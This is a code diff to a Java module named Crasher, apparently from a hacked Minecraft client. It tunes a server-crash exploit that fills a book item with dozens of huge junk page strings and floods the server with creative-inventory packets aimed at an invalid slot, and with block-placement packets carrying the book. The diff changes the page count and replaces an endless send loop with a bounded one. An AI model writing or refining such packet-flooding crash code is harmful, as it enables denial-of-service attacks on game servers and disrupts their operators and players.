@@ -270,6 +270,7 @@ public class Crasher extends Module {
             }
             Minecraft.getMinecraft().getNetHandler().addToSendQueue((Packet) new C08PacketPlayerBlockPlacement(new BlockPos((Minecraft.getMinecraft()).thePlayer.posX, (Minecraft.getMinecraft()).thePlayer.posY - 2.0D, (Minecraft.getMinecraft()).thePlayer.posZ), 1, book, 0.0F, 0.0F, 0.0F));
         }
+        toggle();
     }
 
     public void Newsinglepacket() {
@@ -300,7 +301,7 @@ public class Crasher extends Module {
             String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
             NBTTagCompound tag = new NBTTagCompound();
             NBTTagList list = new NBTTagList();
-            for (int i2 = 0; i2 < 50; i2++) {
+            for (int i2 = 0; i2 < 35; i2++) {
                 String siteContent = size;
                 NBTTagString tString = new NBTTagString(siteContent);
                 list.appendTag((NBTBase) tString);
@@ -310,16 +311,16 @@ public class Crasher extends Module {
             tag.setTag("pages", (NBTBase) list);
             book.setTagInfo("pages", (NBTBase) list);
             book.setTagCompound(tag);
-            while (true) {
-                if (TimeHelper.hasReached(10)) {
+            try {
+                for (int j = 0 ; j < 10; j++)
                     Minecraft.getMinecraft().getNetHandler().addToSendQueue((Packet) new C10PacketCreativeInventoryAction(2147483647, book));
-                }
-
-
+            }catch (Exception e) {
+                e.printStackTrace();
             }
-        } catch (Exception exception) {
-            return;
+        } catch (Exception e) {
+            e.printStackTrace();
         }
+     
     }
 
     public void Commandcrash() {
